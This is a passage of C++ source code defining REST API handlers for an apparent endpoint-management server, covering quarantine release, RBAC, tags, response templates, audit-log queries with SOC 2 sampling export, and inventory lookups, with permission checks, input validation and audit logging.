        [perm_fn, audit_fn, quarantine_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "Security", "Execute"))
                return;
            if (!quarantine_store) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto agent_id = req.matches[1].str();
            auto result = quarantine_store->release_device(agent_id);
            if (!result) {
                res.status = 400;
                res.set_content(error_json(result.error()), "application/json");
                return;
            }
            audit_fn(req, "quarantine.disable", "success", "Security", agent_id, "");
            res.set_content(ok_json(JObj().add("released", true).str()), "application/json");
        });

    // ── RBAC (/api/v1/rbac) ──────────────────────────────────────────────

    sink.Get("/api/v1/rbac/roles",
             [perm_fn, rbac_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "UserManagement", "Read"))
                     return;
                 if (!rbac_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto roles = rbac_store->list_roles();
                 JArr arr;
                 for (const auto& r : roles) {
                     arr.add(JObj()
                                 .add("name", r.name)
                                 .add("description", r.description)
                                 .add("is_system", r.is_system)
                                 .add("created_at", r.created_at));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(roles.size())),
                                 "application/json");
             });

    sink.Get(R"(/api/v1/rbac/roles/(.+)/permissions)",
             [perm_fn, rbac_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "UserManagement", "Read"))
                     return;
                 if (!rbac_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto role_name = req.matches[1].str();
                 auto perms = rbac_store->get_role_permissions(role_name);
                 JArr arr;
                 for (const auto& p : perms) {
                     arr.add(JObj()
                                 .add("securable_type", p.securable_type)
                                 .add("operation", p.operation)
                                 .add("effect", p.effect));
                 }
                 res.set_content(ok_json(arr.str()), "application/json");
             });

    sink.Post("/api/v1/rbac/check", [auth_fn, rbac_store](const httplib::Request& req,
                                                          httplib::Response& res) {
        auto session = auth_fn(req, res);
        if (!session)
            return;
        if (!rbac_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        auto securable_type = body.value("securable_type", "");
        auto operation = body.value("operation", "");
        bool allowed = rbac_store->check_permission(session->username, securable_type, operation);
        res.set_content(ok_json(JObj().add("allowed", allowed).str()), "application/json");
    });

    // ── Tag Categories (/api/v1/tag-categories) ────────────────────────

    sink.Get("/api/v1/tag-categories",
             [perm_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Tag", "Read"))
                     return;

                 const auto& categories = get_tag_categories();
                 JArr arr;
                 for (const auto& cat : categories) {
                     JArr vals;
                     for (auto v : cat.allowed_values)
                         vals.add(v);
                     arr.add(JObj()
                                 .add("key", cat.key)
                                 .add("display_name", cat.display_name)
                                 .raw("allowed_values", vals.str()));
                 }
                 res.set_content(ok_json(arr.str()), "application/json");
             });

    // ── Tag Compliance (/api/v1/tag-compliance) ──────────────────────────

    sink.Get("/api/v1/tag-compliance",
             [perm_fn, tag_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Tag", "Read"))
                     return;
                 if (!tag_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto gaps = tag_store->get_compliance_gaps();
                 JArr arr;
                 for (const auto& [agent_id, missing] : gaps) {
                     JArr m;
                     for (const auto& k : missing)
                         m.add(k);
                     arr.add(JObj().add("agent_id", agent_id).raw("missing_tags", m.str()));
                 }
                 res.set_content(ok_json(arr.str()), "application/json");
             });

    // ── Tags (/api/v1/tags) ──────────────────────────────────────────────

    sink.Get("/api/v1/tags",
             [perm_fn, tag_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Tag", "Read"))
                     return;
                 if (!tag_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto agent_id = req.get_param_value("agent_id");
                 if (agent_id.empty()) {
                     res.status = 400;
                     res.set_content(error_json("agent_id parameter required"), "application/json");
                     return;
                 }
                 auto tags = tag_store->get_all_tags(agent_id);
                 JObj obj;
                 for (size_t i = 0; i < tags.size(); ++i)
                     obj.add(tags[i].key, tags[i].value);
                 res.set_content(ok_json(obj.str()), "application/json");
             });

    sink.Put("/api/v1/tags", [perm_fn, audit_fn, tag_store, service_group_fn,
                              tag_push_fn](const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "Tag", "Write"))
            return;
        if (!tag_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded()) {
            res.status = 400;
            res.set_content(error_json("invalid JSON"), "application/json");
            return;
        }
        auto agent_id = body.value("agent_id", "");
        auto key = body.value("key", "");
        auto value = body.value("value", "");

        // Normalize category keys to lowercase for consistent lookups
        std::string lower_key = key;
        std::transform(lower_key.begin(), lower_key.end(), lower_key.begin(),
                       [](unsigned char c) { return std::tolower(c); });
        for (auto cat : {"role", "environment", "location", "service"}) {
            if (lower_key == cat) {
                key = lower_key;
                break;
            }
        }

        if (agent_id.empty() || key.empty()) {
            res.status = 400;
            res.set_content(error_json("agent_id and key required"), "application/json");
            return;
        }

        auto result = tag_store->set_tag_checked(agent_id, key, value, "api");
        if (!result) {
            res.status = 400;
            res.set_content(error_json(result.error()), "application/json");
            return;
        }
        if (key == "service" && service_group_fn)
            service_group_fn(value);
        if (tag_push_fn)
            tag_push_fn(agent_id, key);
        audit_fn(req, "tag.set", "success", "Tag", agent_id + ":" + key, value);
        res.set_content(ok_json(JObj().add("set", true).str()), "application/json");
    });

    sink.Delete(
        R"(/api/v1/tags/([^/]+)/([^/]+))",
        [perm_fn, audit_fn, tag_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "Tag", "Delete"))
                return;
            if (!tag_store) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto agent_id = req.matches[1].str();
            auto key = req.matches[2].str();
            bool deleted = tag_store->delete_tag(agent_id, key);
            if (!deleted) {
                res.status = 404;
                res.set_content(error_json("tag not found"), "application/json");
                return;
            }
            audit_fn(req, "tag.delete", "success", "Tag", agent_id + ":" + key, "");
            res.set_content(ok_json(JObj().add("deleted", true).str()), "application/json");
        });

    // ── Instructions (/api/v1/definitions) ───────────────────────────────

    sink.Get("/api/v1/definitions",
             [perm_fn, instruction_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "InstructionDefinition", "Read"))
                     return;
                 if (!instruction_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto defs = instruction_store->query_definitions();
                 JArr arr;
                 for (size_t i = 0; i < defs.size(); ++i) {
                     const auto& d = defs[i];
                     arr.add(JObj()
                                 .add("id", d.id)
                                 .add("name", d.name)
                                 .add("description", d.description)
                                 .add("plugin", d.plugin)
                                 .add("action", d.action)
                                 .add("version", d.version)
                                 .add("created_at", d.created_at));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(defs.size())),
                                 "application/json");
             });

    // ── Response Templates (issue #254, capability 20.6) ─────────────────
    //
    // Named response-view configurations (column subset + sort + filters)
    // attached to an InstructionDefinition under `spec.responseTemplates`.
    // Persisted in the `response_templates_spec` JSON column on
    // instruction_definitions; the engine synthesises a `__default__`
    // template from result_schema (or the plugin's column list) when the
    // operator hasn't authored one. Closes Phase 8.2.
    //
    // Path: /api/v1/definitions/{id}/response-templates[/{template_id}]
    // RBAC: List/Get   = InstructionDefinition:Read
    //       POST/PUT/DELETE = InstructionDefinition:Write
    //
    // The {id} regex matches the existing /api/v1/executions/{id}/visualization
    // shape; {template_id} permits the synth-default sentinel `__default__`
    // alongside the 32-hex auto-generated ids by allowing underscores.

    static const std::regex kRtDefIdRegex{"^[A-Za-z0-9._-]{1,128}$"};
    static const std::regex kRtTemplateIdRegex{"^[A-Za-z0-9_-]{1,64}$"};
    // Hardening (governance UP-8 / sec-M2): cap incoming JSON body size on
    // POST/PUT to prevent an authenticated operator from DoS'ing the
    // single-process server with a JSON bomb (nested-array stack overflow
    // through nlohmann's recursive DOM parser). 64 KiB is several
    // orders of magnitude above any realistic template payload.
    //
    // S-9 (governance round-2): this constant is scoped to the response-
    // templates routes only. The other POST/PUT mutation routes in this
    // file (Guardian rule.create, management-group create, tag PUT, token
    // POST, etc.) do not yet enforce a body cap; widening the cap to all
    // mutation routes is tracked as a separate hardening pass so each
    // route can pick a cap appropriate to its payload shape.
    static constexpr size_t kRtMaxBodyBytes = 64 * 1024;

    // Helper: persist a mutated template list back to the definition.
    // Returns std::nullopt on success, an error message on failure.
    auto persist_templates =
        [instruction_store](
            const std::string& definition_id,
            const std::vector<ResponseTemplate>& templates) -> std::optional<std::string> {
        auto def = instruction_store->get_definition(definition_id);
        if (!def)
            return std::string("definition not found");
        ResponseTemplatesEngine engine;
        def->response_templates_spec = engine.serialise(templates);
        auto upd = instruction_store->update_definition(*def);
        if (!upd)
            return upd.error();
        return std::nullopt;
    };

    // GET /api/v1/definitions/{id}/response-templates ─ list
    sink.Get(R"(/api/v1/definitions/([A-Za-z0-9._-]+)/response-templates)",
             [perm_fn, instruction_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "InstructionDefinition", "Read"))
                     return;
                 if (!instruction_store || !instruction_store->is_open()) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto def_id = req.matches[1].str();
                 if (!std::regex_match(def_id, kRtDefIdRegex)) {
                     res.status = 400;
                     res.set_content(error_json("definition id must match [A-Za-z0-9._-]{1,128}"),
                                     "application/json");
                     return;
                 }
                 auto def = instruction_store->get_definition(def_id);
                 if (!def) {
                     res.status = 404;
                     res.set_content(error_json("definition not found"), "application/json");
                     return;
                 }
                 ResponseTemplatesEngine engine;
                 auto parsed = engine.parse(def->response_templates_spec);
                 std::vector<ResponseTemplate> templates;
                 if (parsed)
                     templates = std::move(*parsed);
                 // Always prepend the synthesised default unless the
                 // operator has authored their own default-marked one.
                 bool operator_has_default = false;
                 for (const auto& t : templates)
                     if (t.is_default) {
                         operator_has_default = true;
                         break;
                     }
                 JArr arr;
                 if (!operator_has_default) {
                     auto synth = engine.synthesise_default(def->result_schema, def->plugin);
                     arr.add_raw(engine.to_json(synth).dump());
                 }
                 for (const auto& t : templates) {
                     arr.add_raw(engine.to_json(t).dump());
                 }
                 int64_t total =
                     static_cast<int64_t>(templates.size()) + (operator_has_default ? 0 : 1);
                 res.set_content(list_json(arr.str(), total), "application/json");
             });

    // GET /api/v1/definitions/{id}/response-templates/{tid} ─ get one
    sink.Get(R"(/api/v1/definitions/([A-Za-z0-9._-]+)/response-templates/([A-Za-z0-9_-]+))",
             [perm_fn, instruction_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "InstructionDefinition", "Read"))
                     return;
                 if (!instruction_store || !instruction_store->is_open()) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto def_id = req.matches[1].str();
                 auto tid = req.matches[2].str();
                 if (!std::regex_match(def_id, kRtDefIdRegex) ||
                     !std::regex_match(tid, kRtTemplateIdRegex)) {
                     res.status = 400;
                     res.set_content(error_json("malformed id"), "application/json");
                     return;
                 }
                 auto def = instruction_store->get_definition(def_id);
                 if (!def) {
                     res.status = 404;
                     res.set_content(error_json("definition not found"), "application/json");
                     return;
                 }
                 ResponseTemplatesEngine engine;
                 auto parsed = engine.parse(def->response_templates_spec);
                 std::vector<ResponseTemplate> templates;
                 if (parsed)
                     templates = std::move(*parsed);

                 if (tid == ResponseTemplatesEngine::kDefaultId) {
                     // Always return the synthesised default for the
                     // sentinel id, even when an operator has authored
                     // their own default — the synth view is "what the
                     // dashboard shows when nothing is configured", and
                     // operators introspecting it shouldn't have to know
                     // which path they're on.
                     auto synth = engine.synthesise_default(def->result_schema, def->plugin);
                     res.set_content(ok_json(engine.to_json(synth).dump()), "application/json");
                     return;
                 }
                 for (const auto& t : templates) {
                     if (t.id == tid) {
                         res.set_content(ok_json(engine.to_json(t).dump()), "application/json");
                         return;
                     }
                 }
                 res.status = 404;
                 res.set_content(error_json("template not found"), "application/json");
             });

    // POST /api/v1/definitions/{id}/response-templates ─ create
    sink.Post(R"(/api/v1/definitions/([A-Za-z0-9._-]+)/response-templates)",
              [perm_fn, audit_fn, instruction_store, persist_templates](const httplib::Request& req,
                                                                        httplib::Response& res) {
                  if (!perm_fn(req, res, "InstructionDefinition", "Write"))
                      return;
                  if (!instruction_store || !instruction_store->is_open()) {
                      res.status = 503;
                      res.set_content(error_json("service unavailable", 503), "application/json");
                      return;
                  }
                  auto def_id = req.matches[1].str();
                  if (!std::regex_match(def_id, kRtDefIdRegex)) {
                      res.status = 400;
                      res.set_content(error_json("definition id must match [A-Za-z0-9._-]{1,128}"),
                                      "application/json");
                      audit_fn(req, "response_template.create", "denied", "InstructionDefinition",
                               def_id, "reason=malformed_definition_id");
                      return;
                  }
                  if (req.body.size() > kRtMaxBodyBytes) {
                      res.status = 413;
                      res.set_content(error_json("request body exceeds 64 KiB cap", 413),
                                      "application/json");
                      audit_fn(req, "response_template.create", "denied", "InstructionDefinition",
                               def_id, "reason=body_too_large");
                      return;
                  }
                  auto body = nlohmann::json::parse(req.body, nullptr, false);
                  if (body.is_discarded()) {
                      res.status = 400;
                      res.set_content(error_json("invalid JSON"), "application/json");
                      audit_fn(req, "response_template.create", "denied", "InstructionDefinition",
                               def_id, "reason=invalid_json");
                      return;
                  }
                  auto def = instruction_store->get_definition(def_id);
                  if (!def) {
                      res.status = 404;
                      res.set_content(error_json("definition not found"), "application/json");
                      audit_fn(req, "response_template.create", "denied", "InstructionDefinition",
                               def_id, "reason=definition_not_found");
                      return;
                  }
                  ResponseTemplatesEngine engine;
                  auto parsed = engine.parse(def->response_templates_spec);
                  std::vector<ResponseTemplate> templates;
                  if (parsed)
                      templates = std::move(*parsed);
                  auto validated = engine.validate_payload(body, templates,
                                                           /*expected_id=*/"",
                                                           /*assign_id=*/true);
                  if (!validated) {
                      res.status = 400;
                      res.set_content(error_json(validated.error()), "application/json");
                      audit_fn(req, "response_template.create", "denied", "InstructionDefinition",
                               def_id, "reason=validation_failed");
                      return;
                  }
                  templates.push_back(*validated);
                  if (auto err = persist_templates(def_id, templates); err) {
                      spdlog::error("response_template.create persist failed: def={} err={}",
                                    def_id, *err);
                      res.status = 500;
                      res.set_content(error_json("persist failure"), "application/json");
                      audit_fn(req, "response_template.create", "failure", "InstructionDefinition",
                               def_id, "reason=persist_failure");
                      return;
                  }
                  audit_fn(req, "response_template.create", "success", "InstructionDefinition",
                           def_id, validated->id);
                  res.status = 201;
                  res.set_content(ok_json(engine.to_json(*validated).dump()), "application/json");
              });

    // PUT /api/v1/definitions/{id}/response-templates/{tid} ─ replace
    sink.Put(R"(/api/v1/definitions/([A-Za-z0-9._-]+)/response-templates/([A-Za-z0-9_-]+))",
             [perm_fn, audit_fn, instruction_store, persist_templates](const httplib::Request& req,
                                                                       httplib::Response& res) {
                 if (!perm_fn(req, res, "InstructionDefinition", "Write"))
                     return;
                 if (!instruction_store || !instruction_store->is_open()) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto def_id = req.matches[1].str();
                 auto tid = req.matches[2].str();
                 if (!std::regex_match(def_id, kRtDefIdRegex) ||
                     !std::regex_match(tid, kRtTemplateIdRegex)) {
                     res.status = 400;
                     res.set_content(error_json("malformed id"), "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=malformed_id");
                     return;
                 }
                 if (tid == ResponseTemplatesEngine::kDefaultId) {
                     res.status = 400;
                     res.set_content(error_json("'__default__' is reserved for the synthesised "
                                                "default; create a new template instead"),
                                     "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=reserved_id");
                     return;
                 }
                 if (req.body.size() > kRtMaxBodyBytes) {
                     res.status = 413;
                     res.set_content(error_json("request body exceeds 64 KiB cap", 413),
                                     "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=body_too_large");
                     return;
                 }
                 auto body = nlohmann::json::parse(req.body, nullptr, false);
                 if (body.is_discarded()) {
                     res.status = 400;
                     res.set_content(error_json("invalid JSON"), "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=invalid_json");
                     return;
                 }
                 auto def = instruction_store->get_definition(def_id);
                 if (!def) {
                     res.status = 404;
                     res.set_content(error_json("definition not found"), "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=definition_not_found");
                     return;
                 }
                 ResponseTemplatesEngine engine;
                 auto parsed = engine.parse(def->response_templates_spec);
                 std::vector<ResponseTemplate> templates;
                 if (parsed)
                     templates = std::move(*parsed);
                 bool found = false;
                 for (const auto& t : templates)
                     if (t.id == tid) {
                         found = true;
                         break;
                     }
                 if (!found) {
                     res.status = 404;
                     res.set_content(error_json("template not found"), "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=template_not_found");
                     return;
                 }
                 auto validated = engine.validate_payload(body, templates,
                                                          /*expected_id=*/tid,
                                                          /*assign_id=*/false);
                 if (!validated) {
                     res.status = 400;
                     res.set_content(error_json(validated.error()), "application/json");
                     audit_fn(req, "response_template.update", "denied", "InstructionDefinition",
                              def_id, "reason=validation_failed");
                     return;
                 }
                 for (auto& t : templates) {
                     if (t.id == tid) {
                         t = *validated;
                         break;
                     }
                 }
                 if (auto err = persist_templates(def_id, templates); err) {
                     spdlog::error("response_template.update persist failed: def={} tid={} err={}",
                                   def_id, tid, *err);
                     res.status = 500;
                     res.set_content(error_json("persist failure"), "application/json");
                     audit_fn(req, "response_template.update", "failure", "InstructionDefinition",
                              def_id, "reason=persist_failure");
                     return;
                 }
                 audit_fn(req, "response_template.update", "success", "InstructionDefinition",
                          def_id, tid);
                 res.set_content(ok_json(engine.to_json(*validated).dump()), "application/json");
             });

    // DELETE /api/v1/definitions/{id}/response-templates/{tid}
    sink.Delete(
        R"(/api/v1/definitions/([A-Za-z0-9._-]+)/response-templates/([A-Za-z0-9_-]+))",
        [perm_fn, audit_fn, instruction_store, persist_templates](const httplib::Request& req,
                                                                  httplib::Response& res) {
            if (!perm_fn(req, res, "InstructionDefinition", "Write"))
                return;
            if (!instruction_store || !instruction_store->is_open()) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }
            auto def_id = req.matches[1].str();
            auto tid = req.matches[2].str();
            if (!std::regex_match(def_id, kRtDefIdRegex) ||
                !std::regex_match(tid, kRtTemplateIdRegex)) {
                res.status = 400;
                res.set_content(error_json("malformed id"), "application/json");
                audit_fn(req, "response_template.delete", "denied", "InstructionDefinition", def_id,
                         "reason=malformed_id");
                return;
            }
            if (tid == ResponseTemplatesEngine::kDefaultId) {
                res.status = 400;
                res.set_content(error_json("the synthesised default template "
                                           "cannot be deleted"),
                                "application/json");
                audit_fn(req, "response_template.delete", "denied", "InstructionDefinition", def_id,
                         "reason=reserved_id");
                return;
            }
            auto def = instruction_store->get_definition(def_id);
            if (!def) {
                res.status = 404;
                res.set_content(error_json("definition not found"), "application/json");
                audit_fn(req, "response_template.delete", "denied", "InstructionDefinition", def_id,
                         "reason=definition_not_found");
                return;
            }
            ResponseTemplatesEngine engine;
            auto parsed = engine.parse(def->response_templates_spec);
            std::vector<ResponseTemplate> templates;
            if (parsed)
                templates = std::move(*parsed);
            auto before = templates.size();
            templates.erase(std::remove_if(templates.begin(), templates.end(),
                                           [&](const ResponseTemplate& t) { return t.id == tid; }),
                            templates.end());
            if (templates.size() == before) {
                res.status = 404;
                res.set_content(error_json("template not found"), "application/json");
                audit_fn(req, "response_template.delete", "denied", "InstructionDefinition", def_id,
                         "reason=template_not_found");
                return;
            }
            if (auto err = persist_templates(def_id, templates); err) {
                spdlog::error("response_template.delete persist failed: def={} tid={} err={}",
                              def_id, tid, *err);
                res.status = 500;
                res.set_content(error_json("persist failure"), "application/json");
                audit_fn(req, "response_template.delete", "failure", "InstructionDefinition",
                         def_id, "reason=persist_failure");
                return;
            }
            audit_fn(req, "response_template.delete", "success", "InstructionDefinition", def_id,
                     tid);
            res.set_content(ok_json(JObj().add("deleted", true).str()), "application/json");
        });

    // ── Audit (/api/v1/audit) ────────────────────────────────────────────

    sink.Get("/api/v1/audit",
             [perm_fn, audit_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "AuditLog", "Read"))
                     return;
                 if (!audit_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 AuditQuery q;
                 auto limit_str = req.get_param_value("limit");
                 if (!limit_str.empty()) {
                     try {
                         q.limit = std::stoi(limit_str);
                     } catch (...) {}
                 }
                 if (q.limit > 1000)
                     q.limit = 1000;
                 q.principal = req.get_param_value("principal");
                 q.action = req.get_param_value("action");

                 auto events = audit_store->query(q);
                 JArr arr;
                 for (size_t i = 0; i < events.size(); ++i) {
                     const auto& e = events[i];
                     arr.add(JObj()
                                 .add("timestamp", e.timestamp)
                                 .add("principal", e.principal)
                                 .add("action", e.action)
                                 .add("result", e.result)
                                 .add("target_type", e.target_type)
                                 .add("target_id", e.target_id)
                                 .add("detail", e.detail));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(events.size())),
                                 "application/json");
             });

    // GET /api/v1/audit/auth-sample — pseudo-random sample of authentication-
    // surface audit events over an optional [from,to] window, for SOC 2 CC7.2
    // sampled-evidence export. Scoped to the auth./mfa./session. action prefixes.
    // Gated on AuditLog:Read (consistent with /api/v1/audit, and lets a read-only
    // auditor role pull evidence without full admin — separation of duties). The
    // export itself is audited (audit.auth_sample.exported) so evidence access is
    // on the chain.
    sink.Get(
        "/api/v1/audit/auth-sample",
        [perm_fn, audit_fn, audit_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "AuditLog", "Read"))
                return;
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            // A broken/closed audit store must FAIL LOUD, not return an empty
            // 200 — on a CC7.2 evidence endpoint an empty sample reads as "no
            // authentication activity" when the truth is "the store is down".
            // !is_open() is the platform-wide store-down guard
            // (docs/observability-conventions.md), the 15+ peer routes in this
            // file all carry it, and docs/user-manual/rest-api.md promises 503
            // when the audit store is unavailable. Checking only the pointer
            // (store wired but DB never opened) let a null handle return an
            // empty query result as 200 — misleading evidence, not missing.
            if (!audit_store || !audit_store->is_open()) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "audit store unavailable", cid,
                                          /*retry_after_ms=*/5000,
                                          "retry after server warmup; the audit store opens during "
                                          "startup or after a config reload"),
                    "application/json");
                return;
            }

            AuditQuery q;
            q.action_prefixes = {"auth.", "mfa.", "session."};
            q.random_sample = true;
            // std::stoll throws std::out_of_range on overflow (unlike strtoll) — the
            // catch turns that into a 400, so no separate errno/ceiling check is
            // needed. out>=0 rejects negatives.
            auto parse_epoch = [](const std::string& s, int64_t& out) -> bool {
                if (s.empty())
                    return true; // optional — leave default (unbounded that side)
                // Reject leading whitespace / '+' / '-' that std::stoll would
                // otherwise silently accept (cpp-expert S-1 / UP-9): a strict
                // digits-only contract, so "non-numeric → 400" is literally true.
                if (!std::isdigit(static_cast<unsigned char>(s.front())))
                    return false;
                try {
                    size_t consumed = 0;
                    out = std::stoll(s, &consumed);
                    return consumed == s.size() && out >= 0; // reject trailing junk
                } catch (const std::invalid_argument&) {
                    return false;
                } catch (const std::out_of_range&) {
                    return false; // overflow — std::stoll throws (unlike strtoll)
                }
                // Narrow catches only — std::bad_alloc and other fatal exceptions
                // propagate rather than masquerading as a 400 (Hermes L-2).
            };
            if (!parse_epoch(req.get_param_value("from"), q.since) ||
                !parse_epoch(req.get_param_value("to"), q.until)) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "from/to must be non-negative epoch seconds", cid,
                                          "pass from/to as non-negative integer epoch seconds"),
                    "application/json");
                return;
            }
            // Inverted window is a client bug, not "no data" (Hermes L-3).
            if (q.since > 0 && q.until > 0 && q.since > q.until) {
                res.status = 400;
                res.set_content(detail::error_json_a4(400, "from must be <= to", cid,
                                                      "ensure from <= to"),
                                "application/json");
                return;
            }
            // Malformed limit is a 400, not a silent fallback to the default
            // (Hermes L-2 — stricter than the legacy /api/v1/audit).
            auto limit_str = req.get_param_value("limit");
            if (!limit_str.empty()) {
                bool limit_bad = !std::isdigit(static_cast<unsigned char>(limit_str.front()));
                try {
                    size_t consumed = 0;
                    q.limit = std::stoi(limit_str, &consumed);
                    limit_bad = limit_bad || (consumed != limit_str.size()); // trailing junk
                } catch (const std::invalid_argument&) {
                    limit_bad = true;
                } catch (const std::out_of_range&) {
                    limit_bad = true;
                }
                // Narrow catches only (Hermes L-2) — std::bad_alloc propagates.
                if (limit_bad) {
                    res.status = 400;
                    res.set_content(detail::error_json_a4(400, "limit must be an integer", cid,
                                                          "pass limit as a positive integer"),
                                    "application/json");
                    return;
                }
            }
            if (q.limit > 1000)
                q.limit = 1000;
            if (q.limit < 1)
                q.limit = 1;

            std::size_t pool_size = 0;
            auto events = audit_store->query(q, &pool_size);
            // recency_capped: the window held at least the scan cap, so the sample
            // was drawn only from the most-recent kAuditSampleScanCap events and is
            // NOT a uniform sample of the full window. Surfaced in the response so an
            // auditor never presents a biased sample as representative (CC7.2 evidence
            // honesty — compliance/architect SHOULD).
            const bool recency_capped = (pool_size >= kAuditSampleScanCap);
            // Field set matches the sibling GET /api/v1/audit exactly (Hermes M-2):
            // auth-sample does NOT widen what an AuditLog:Read principal can see —
            // session_id (session bearer correlation) and source_ip are deliberately
            // NOT exposed here. A richer evidence view, if needed, is a follow-up
            // under a narrower permission.
            JArr arr;
            for (const auto& e : events) {
                arr.add(JObj()
                            .add("timestamp", e.timestamp)
                            .add("principal", e.principal)
                            .add("action", e.action)
                            .add("result", e.result)
                            .add("target_type", e.target_type)
                            .add("target_id", e.target_id)
                            .add("detail", e.detail));
            }
            // Evidence access is itself auditable (CC7.2): record who exported which
            // window and how many rows. The read still proceeds if audit persistence
            // fails, but the failure is made VISIBLE (Hermes M-1, repudiation gap) via
            // a warn log + a `Sec-Audit-Failed: true` response header — never silently
            // swallowed. result="success" matches the dominant audit vocabulary and
            // the analogous self-auditing export `ca.root_csr.exported` (consistency S1).
            bool audit_emitted = false;
            try {
                std::string detail = "from=" + std::to_string(q.since) +
                                     " to=" + std::to_string(q.until) +
                                     " limit=" + std::to_string(q.limit) +
                                     " returned=" + std::to_string(events.size());
                audit_emitted = audit_fn(req, "audit.auth_sample.exported", "success", "AuditLog",
                                         "auth-sample", detail);
            } catch (const std::exception& ex) {
                spdlog::warn("audit.auth_sample.exported emission threw: {}", ex.what());
            }
            if (!audit_emitted) {
                spdlog::warn("audit.auth_sample.exported did not persist — evidence-chain gap "
                             "for an auth-sample export");
                res.set_header("Sec-Audit-Failed", "true");
            }
            // Envelope mirrors list_json (data + pagination + meta) and adds a
            // `sampling` block so the evidence semantics are honest in the response
            // itself: candidates_considered = pool the sample was drawn from,
            // recency_capped = that pool hit the scan cap (sample is recency-biased,
            // not uniform over the window). page_size = the actual limit (Hermes L-1).
            std::string pagination = JObj()
                                         .add("total", static_cast<int64_t>(events.size()))
                                         .add("start", static_cast<int64_t>(0))
                                         .add("page_size", static_cast<int64_t>(q.limit))
                                         .str();
            std::string sampling = JObj()
                                       .add("candidates_considered", static_cast<int64_t>(pool_size))
                                       .add("scan_cap", static_cast<int64_t>(kAuditSampleScanCap))
                                       .add("recency_capped", recency_capped)
                                       .str();
            std::string body = JObj()
                                   .raw("data", arr.str())
                                   .raw("pagination", pagination)
                                   .raw("sampling", sampling)
                                   .raw("meta", R"({"api_version":"v1"})")
                                   .str();
            res.set_content(body, "application/json");
        });

    // ── Inventory (/api/v1/inventory) ──────────────────────────────────

    sink.Get("/api/v1/inventory/tables", [perm_fn, inventory_store](const httplib::Request& req,
                                                                    httplib::Response& res) {
        if (!perm_fn(req, res, "Inventory", "Read"))
            return;
        if (!inventory_store || !inventory_store->is_open()) {
            res.status = 503;
            res.set_content(error_json("inventory store not available"), "application/json");
            return;
        }

        auto tables = inventory_store->list_tables();
        JArr arr;
        for (const auto& t : tables) {
            arr.add(JObj()
                        .add("plugin", t.plugin)
                        .add("agent_count", t.agent_count)
                        .add("last_collected", t.last_collected));
        }
        res.set_content(list_json(arr.str(), static_cast<int64_t>(tables.size())),
                        "application/json");
    });

    sink.Get(R"(/api/v1/inventory/([^/]+)/([^/]+))",
             [perm_fn, inventory_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Inventory", "Read"))
                     return;
                 if (!inventory_store || !inventory_store->is_open()) {
                     res.status = 503;
                     res.set_content(error_json("inventory store not available"),
                                     "application/json");
                     return;
                 }

                 auto agent_id = req.matches[1].str();
                 auto plugin = req.matches[2].str();

                 auto record = inventory_store->get(agent_id, plugin);
                 if (!record) {
                     res.status = 404;
                     res.set_content(error_json("no inventory data found"), "application/json");
                     return;
                 }

                 // Embed data_json as raw JSON if valid, otherwise as a quoted string
                 auto parsed = nlohmann::json::parse(record->data_json, nullptr, false);
                 JObj data;
                 data.add("agent_id", record->agent_id).add("plugin", record->plugin);
                 if (!parsed.is_discarded()) {
                     data.raw("data", record->data_json);
                 } else {
                     data.add("data", record->data_json);
                 }
